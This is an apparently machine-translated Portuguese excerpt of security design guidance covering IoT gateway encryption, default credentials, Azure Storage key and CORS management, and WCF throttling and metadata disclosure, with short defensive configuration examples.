## <a id="field-bit-locker"></a>Criptografar o sistema operacional e partições adicionais do gateway de campo IoT com o armário de bits

| Cargo                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Gateway de campo IoT | 
| **Fase do SDL**               | Implementação |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | N/A  |
| **Referências**              | N/A  |
| **Passos** | O Windows 10 IoT Core implementa uma versão leve da criptografia de dispositivo do BitLocker, que tem uma forte dependência da presença de um TPM na plataforma, incluindo o protocolo preOS necessário em UEFI que conduz as medições necessárias. Essas medições de preOS garantem que o sistema operacional mais tarde tenha um registro definitivo de como o sistema operacional foi iniciado. Criptografe as partições do sistema operacional usando o armário de bits e todas as partições adicionais também, caso eles armazenem dados confidenciais. |

## <a id="default-change"></a>Verifique se as credenciais de logon padrão do gateway de campo foram alteradas durante a instalação

| Cargo                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Gateway de campo IoT | 
| **Fase do SDL**               | Implementação |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | N/A  |
| **Referências**              | N/A  |
| **Passos** | Verifique se as credenciais de logon padrão do gateway de campo foram alteradas durante a instalação |

## <a id="cloud-firmware"></a>Verifique se o gateway de nuvem implementa um processo para manter o firmware dos dispositivos conectados atualizado

| Cargo                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Gateway de nuvem IoT | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | Opção de gateway-Hub IoT do Azure |
| **Referências**              | [Visão geral do gerenciamento de dispositivos do Hub IOT](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [como atualizar o firmware do dispositivo](https://docs.microsoft.com/azure/iot-hub/tutorial-firmware-update) |
| **Passos** | LWM2M é um protocolo do gerenciamento de dispositivos Open Mobile Alliance para IoT. O gerenciamento de dispositivos IoT do Azure permite interagir com dispositivos físicos usando trabalhos de dispositivo. Verifique se o gateway de nuvem implementa um processo para manter rotineiramente o dispositivo e outros dados de configuração atualizados usando o gerenciamento de dispositivos do Hub IoT do Azure. |

## <a id="controls-policies"></a>Verifique se os dispositivos têm controles de segurança de ponto de extremidade configurados de acordo com as políticas organizacionais

| Cargo                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Limite de confiança do computador | 
| **Fase do SDL**               | Implementação |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | N/A  |
| **Referências**              | N/A  |
| **Passos** | Verifique se os dispositivos têm controles de segurança de ponto de extremidade, como o armário de bits para criptografia em nível de disco, antivírus com assinaturas atualizadas, firewall baseado em host, atualizações de sistema operacional, políticas de grupo etc. são configurados de acordo com as políticas de segurança organizacional. |

## <a id="secure-keys"></a>Garantir o gerenciamento seguro de chaves de acesso de armazenamento do Azure

| Cargo                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Storage do Azure | 
| **Fase do SDL**               | Implementação |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | N/A  |
| **Referências**              | [Guia de segurança do armazenamento do Azure-Gerenciando suas chaves de conta de armazenamento](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
| **Passos** | <p>Armazenamento de chaves: É recomendável armazenar as chaves de acesso de armazenamento do Azure em Azure Key Vault como um segredo e fazer com que os aplicativos recuperem a chave do Key Vault. Isso é recomendado devido aos seguintes motivos:</p><ul><li>O aplicativo nunca terá a chave de armazenamento codificada em um arquivo de configuração, o que remove essa avenida de alguém que está obtendo acesso às chaves sem permissão específica</li><li>O acesso às chaves pode ser controlado usando Azure Active Directory. Isso significa que um proprietário de conta pode conceder acesso a alguns aplicativos que precisam recuperar as chaves de Azure Key Vault. Outros aplicativos não poderão acessar as chaves sem conceder a permissão especificamente</li><li>Regeneração de chave: É recomendável ter um processo em vigor para regenerar chaves de acesso de armazenamento do Azure por motivos de segurança. Os detalhes sobre por que e como planejar a regeneração de chave estão documentados no artigo de referência do guia de segurança do armazenamento do Azure</li></ul>|

## <a id="cors-storage"></a>Certifique-se de que apenas origens confiáveis sejam permitidas se o CORS estiver habilitado no armazenamento do Azure

| Cargo                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Storage do Azure | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | N/A  |
| **Referências**              | [Suporte a CORS para os serviços de armazenamento do Azure](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
| **Passos** | O armazenamento do Azure permite habilitar o CORS – compartilhamento de recursos entre origens. Para cada conta de armazenamento, você pode especificar domínios que podem acessar os recursos nessa conta de armazenamento. Por padrão, o CORS está desabilitado em todos os serviços. Você pode habilitar o CORS usando a API REST ou a biblioteca de cliente de armazenamento para chamar um dos métodos para definir as políticas de serviço. |

## <a id="throttling"></a>Habilitar o recurso de limitação de serviço do WCF

| Cargo                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | WCF | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | .NET Framework 3 |
| **Atributos**              | N/A  |
| **Referências**              | [Msdn](https://msdn.microsoft.com/library/ff648500.aspx), [fortalecer o Reino Unido](https://vulncat.fortify.com) |
| **Passos** | <p>Não colocar um limite no uso de recursos do sistema pode resultar em esgotamento de recursos e, finalmente, em uma negação de serviço.</p><ul><li>**EXPLICA** O Windows Communication Foundation (WCF) oferece a capacidade de acelerar as solicitações de serviço. Permitir muitas solicitações de clientes pode inundar um sistema e esgotar seus recursos. Por outro lado, permitir que apenas um pequeno número de solicitações para um serviço pode impedir que usuários legítimos usem o serviço. Cada serviço deve ser ajustado e configurado individualmente para permitir a quantidade apropriada de recursos.</li><li>**Recomendações** Habilite o recurso de limitação de serviço do WCF e defina os limites apropriados para seu aplicativo.</li></ul>|

### <a name="example"></a>Exemplo
Veja a seguir um exemplo de configuração com limitação habilitada:
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a id="info-metadata"></a>WCF-divulgação de informações por meio de metadados

| Cargo                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | WCF | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | .NET Framework 3 |
| **Atributos**              | N/A  |
| **Referências**              | [Msdn](https://msdn.microsoft.com/library/ff648500.aspx), [fortalecer o Reino Unido](https://vulncat.fortify.com) |
| **Passos** | Os metadados podem ajudar os invasores a aprender sobre o sistema e planejar uma forma de ataque. Os serviços WCF podem ser configurados para expor metadados. Os metadados fornecem informações detalhadas de descrição do serviço e não devem ser transmitidos em ambientes de produção. As `HttpGetEnabled` Propriedadesdaclasse`HttpsGetEnabled` usermetadata definem se um serviço vai expor os metadados  /  | 

### <a name="example"></a>Exemplo
O código a seguir instrui o WCF a transmitir os metadados de um serviço
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
Não transmita os metadados do serviço em um ambiente de produção. Defina as propriedades HttpGetEnabled/HttpsGetEnabled da classe usermetadata como false. 

### <a name="example"></a>Exemplo
O código a seguir instrui o WCF a não difundir os metadados de um serviço. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```
